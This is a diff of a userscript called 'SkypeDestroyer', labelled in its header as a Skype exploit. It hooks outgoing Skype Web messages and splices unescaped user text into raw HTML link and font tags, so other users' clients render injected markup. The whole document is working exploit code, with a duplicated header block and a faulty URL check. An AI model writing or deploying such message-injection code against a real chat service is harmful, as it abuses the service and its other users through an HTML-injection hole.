@@ -1,4 +1,14 @@
 // ==UserScript==
+// @name         My Fancy New Userscript
+// @namespace    http://your.homepage/
+// @version      0.1
+// @description  Skype exploit
+// @author       You
+// @include      https://web.skype.com/en/
+// @grant        none
+// ==/UserScript==
+
+// ==UserScript==
 // @name         SkypeDestroyer
 // @namespace    http://mzinck.com
 // @version      0.1
@@ -27,14 +37,26 @@
         var k;
         if(isMsg(data) && data != null) {       
             k = JSON.parse(data);
+            var size = null;
+            if(k.content.indexOf("!") > -1) {
+                size = k.content.match(/\!(.*?)\!/)[1];
+            }
             if(k.content.substring(0, 1) === "#") {    
-                k = replaceContent(k);
-                if(k !== null ) {
+                k = replaceURL(k);
+                if(k !== null) {
                     k = JSON.stringify(k);
                     data = k;
                 }
-            }
-                    console.log(data);
+                if(size !== null) {
+                    k = changeFontSize(JSON.parse(data), size);
+                    if(k !== null) {
+                        k = JSON.stringify(k);
+                        data = k;
+                    }
+                }
+            } 
+
+            console.log(data);
         }        
 
         var self = this;
@@ -97,7 +119,7 @@ function isMsg(value) {
     }
 }
 
-function replaceContent(data) {
+function replaceURL(data) {
     try {
         if(data.content.match(/\[(.*?)\]/)[1].indexOf("http://") == -1 || data.content.match(/\[(.*?)\]/)[1].indexOf("https://") == -1) {            
             data.content = "<a href='http://" +  data.content.match(/\[(.*?)\]/)[1] + "'>" + data.content.match(/\(([^)]+)\)/)[1] + "</a>";
@@ -110,3 +132,17 @@ function replaceContent(data) {
     }
 }
 
+function changeFontSize(data, size) {
+    try {
+        if(data.content.indexOf("#") > -1) {
+            data.content = data.content.replace('#','');
+            data.content = data.content.replace(data.content.match(/\!(.*?)\!/)[1], '');
+            data.content = data.content.replace(/!/g, '');
+        }
+       
+        data.content = "<font size='" +  size + "'>" + data.content + "</font>";
+        return data;
+    } catch(ex) {
+        return null;
+    }
+}
